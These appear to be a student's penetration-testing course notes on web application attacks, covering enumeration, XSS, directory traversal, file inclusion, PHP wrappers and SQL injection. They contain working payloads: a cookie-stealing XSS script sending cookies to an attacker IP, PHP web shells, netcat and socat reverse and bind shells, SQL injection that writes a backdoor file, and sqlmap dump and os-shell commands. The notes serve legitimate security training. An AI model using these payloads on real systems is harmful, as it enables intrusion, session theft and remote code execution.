8 Web Application Attacks

# Web Application Enumeration

Identify the technology stack:
- Programming language and frameworks
- Web server software
- Database software
- Server operating system

Inspect page content with the Firefox Debugger tool (Ctrl-Shift K).
Find versions of jquery etc.
Use network tab to look at headers and find server details.
Check robots.txt and sitemap.xml.
Check for default administration consoles such as /manager/html for Tomcat or /phpmyadmin for MySQL.

## DIRB
Perform a non-recursive search with a 10 millisecond delay to each request:
`dirb http://www.megacorpone.com -r -z 10`

## Burp

* Disable proxy interception on startup under User Options > Misc > Proxy Interception.
* Add FoxyProxy Basic (or Standard) to Firefox.
* Get a new unique Burp CA for HTTPS:
  * Proxy > Options > Proxy Listeners > Regenerate CA Certificate.
  * http://burp.
  * Save cacert.der.
  * Firefox > Settings > Privacy & Security > View Certificates > Import.
  * Enjoy HTTPS goodness without errors.

## Nikto

Nikto is a highly configurable Open Source web server scanner that tests for thousands of dangerous files and programs, vulnerable server versions and various server configuration issues.

The -maxtime option will halt the scan after the specified time limit. This does not optimize the scan in any way. Nikto will simply stop scanning. Tune the scan with the -T option. We can use this feature to control which types of tests we want to run. There are times when we do not want to run all the tests built in to Nikto, such as verifying if a certain class of vulnerabilities is present. Nikto can be slow on large websites and is not stealthy as it sends so many requests, as well as identifying itself in the User-Agent header.

`nikto -host=http://www.megacorpone.com -maxtime=30s`

## Web Admin Exploitation Example

https://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern

Example of Burp and phpMyAdmin. Even though you can't use Burp in the exam...

1. Submit a login request for for intruder to analyse.
2. Right click on the POST request in Burp and send to intruder.
3. On the positions tab clear all set positions and add the cookie, set_session, token and password.
4. Select pitchfork attack type so we can use different values for each position. https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types
  * The attack iterates through all payload sets simultaneously, and places one payload into each defined position. In other words, the first request will place the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second request will place the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc. 
5. Under options navigate to Grep -Extract which will save results of a request and make them available for the next one. Highlight the area of the token or set_session and it will extract the field.
6. Navigate to payloads. Add the recursive greps and the password.
7. Start attack.
8. Identify the 302 different response. Login with same password.
9. Run SQL query:
   * `select * from webappdb.users;`
   * `insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");`

# Cross-Site Scripting (XSS)

Look for entry points (search fields, comment fields, logins etc) and enter special characters to see if they are encoded, for example `< > ' " { } ;`. If they are not encoded or removed, the site may be vulnerable to XSS to introduce code.

If the entered text is printed back to the page, check with inspector if it is encoded in any way.

Content can be injected for client-side attacks and redirect the browser. A stealth method is using an iframe to introduce the payload. Note the 0 heigh and width:
`<iframe src=http://192.168.0.163/report height=”0” width=”0”></iframe>`. Submit and on target:  
`sudo nc -nvlp 80`

Note we can see the User-Agent header and other information on the victim's browser to help conduct further attacks. XSS can be used to steal cookies and session information from applications with insecure session management. Two important flags are:
* Secure - the browser only sends the cookie over encrypted connections such as HTTPS, preventing capture of the cookie.
* HttpOnly 0 denies JavaScript access to the cookie. If set, we cannot use an XSS payload to steal the cookie.
* Other issues include browsers prevent cookies set by one domain from being sent to another. This can be relaxed for subdomains in the set-cookie directive via the domain and path flags. A workaround if JavaScript can bhe used is to use the value as part of a link and send the link, which could be used to deconstruct the cookie.

Cookie stealing XSS payload:  
`<script>new Image().src="http://192.168.119.231/cool.jpg?output="+document.cookie;</script>`  
`sudo nc -nvlp 80`

When someone visits the page we can obtain their cookie. Use Cookie-Editor by Moutsachauve on FF to impersonate. Practice with Kali Beef.

# Directory Traversal Vulnerabilities

Look in the URL query strings and bodies for evidence the values appear as file references. For example: `/menu,php?file=current_menu.php`.  
Try swapping out the file for something else: `menu.php?file=c:\windows\system32\drivers\etc\hosts`.  
An important distrinction is whether files can be read both in and outside the web root directory.

# File Inclusion Vulnerabilities

Similar to the directory traversal, we are looking for parameters that can be manipulated. In file inclusion vulnerabilities, we are looking to execute the contents of the file in the application. This can also include trying a remote URL as well as local files. 

The server needs to include or execute the file we are trying to include, not just display it's contents. One way to inject code onto the server is through log file poisoning. If application servers are logging all URLs requested, we can submit a request including PHP code. Once it is logged, we can use the log file in the LFI payload.

Connect to the target server: `nc -nv <ip> 80`. Once connected send:
`<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`  
This will cause the PHP application to execute:
`<?php echo shell_exec($_GET[‘cmd’]);?> `

With this payload now in the log file, we can attempt local file inclusion (LFI) execution:  
`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`

Other examples:
http://192.168.231.52/menu.php?file=/var/log/apache2/access.log&cmd=cat /etc/passwd`

/cmd.php&cmd=nc -nvlp 60000 -e /bin/bash
socat -d TCP4-LISTEN:60000 EXEC:/bin/bash

# Remote File Inclusion

Lesson common than LFI but easier to exploit. PHP apps need to be configured with `allow_url_include` set to on. This was on by default previously, but is now off.  
`http://192.168.231.52/menu.php?file=http://192.168.231.53/bad.txt`  
You can test if the server will reach out with netcat.

Other useful tricks:
* Older versions of PHP allowed the use of a null byte to terminate any string and bypass file extensions (%00).
* https://www.php.net/manual/en/security.filesystem.nullbytes.php
* End RFI payloads wqith a question mark to make anything added to the URL server-side as part of the query string.
* Use RFI with some of the webshells in /usr/share/webshells.

Simple payload:  
`<?php echo shell_exec($_GET['cmd']); ?>`

In exercises serving up files with Apache did not always work, so test other web servers:  
Python 2:  
`python -m SimpleHTTPServer 7331`  
Python 3:  
`python3 -m http.server 80`  
PHP:  
`php -S 0.0.0.0:8000`  
Ruby:  
`ruby -run -e httpd . -p 9000`
busybox:
`busybox httpd -f -p 10000`

# PHP Wrappers

Protocol wrappers allow additional flexibility when attempting to inject PHP code via LFI vulnerabilities. Two useful wrappers are the data wrapper for inline data and base64 encoded data which allows for an alternative payload when there is no local file to poison.

data : type of data : comma to mark start of contents.  
`http://192.168.231.10/menu.php?file=data:text/plain,hello world`  
`http://192.168.231.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  
`192.168.231.10/menu.php?file=data:text/plain,<?php echo shell_exec("nc 192.168.119.231 80 -e cmd.exe") ?>`  

# SQL Injection

SQL uses a single quote `'` as a string delimeter. If an application cannot handle this character and throws an error, it may indicate an SQL vulnerability injection. Look for informational errors indicating the database software and running application/web servers/operating systems.

### Authentication Bypass

Take this normal login query:  
`select * from users where name = 'admin' and password = 'pass';`

If vulnerable to SQL injection we can enter `admin' or 1=1;#` as the username:  
select * from users where name = 'admin' or 1=1;#' and password = 'pass';

Since 1=1 always evaluates to true, we may be able to bypass the password check. Some applicatons may require only one row to be returned in which case we can use the `LIMIT` statement:
select * from users where name = 'admin' or 1=1 LIMIT 1;#' and password = 'pass';

For some unknown reason the exercises for this section encompassed the training for the following section on using the UNION ALL.

### Enumerating and Extracting Data

Using the order by clause we can enumerate how many columns there are:  
```sql
debug.php?id=1 ORDER BY 1
debug.php?id=1 ORDER BY 2
debug.php?id=1 ORDER BY 3
debug.php?id=1 ORDER BY 4
```
We will receive an error when we have reached the maximum columns in the query. This is useful if no access to source query. This can be automated using Burp Suite's repeater.

Now that we know how many columns are in a table, we can use a UNION statement to extract more information. This allows us to add a second SELECT statement to the original query using the same number of enumerated columns.  
`ebug.php?id=1 union all select 1, 2, 3`  

This displays the position of different columns. We can then subtitute in different values to enumerate:
```sql
debug.php?id=1 union all select 1, 2, @@version
debug.php?id=1 union all select 1, 2, user()

# Enumerate information through the schema:
debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

# Maybe we saw a users table from the above enumeration:
debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'

# Now we can extract information:
debug.php?id=1 union all select 1, username, password from users
```

### SQL Code Injuection

Can we use the load_file function?  
`debug.php?id=1 union all select 1, username, password from users`  

During testing we will likely see the server's web root. We can try dropping a one liner PHP command similar to LFI:
`debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'`  

And access it:
`191.168.231.10/backdoor.php?cmd=ipconfig`

### Automating SQL Injection

Contuing on we can use sqlmap to automate enumeration:  
`sqlmap -u http://<IP>/debug.php?id=1 -p "id"`  
`-u` is the URL while `p` is the parameter to test.  

Once ran we can automate data extraction from the database with the `--dbms` set to the backend type and `--dump` to dump the contents of the database:  
sqlmap -u http://<ip>/debug.php?id=1 -p "id" --dbms=mysql --dump  

Sqlmap can attempt WAF bypass and complex queries. `--os-shell` will try and get a shell on the system.  
`sqlmap -u http://<ip>/debug.php?id=1 -p "id" --dbms=mysql --os-shell`

For the exam Ssqlmap is not permitted. For training they recommend using it with Burp and Wireshark to capture what they are doing and replicate manually.

 





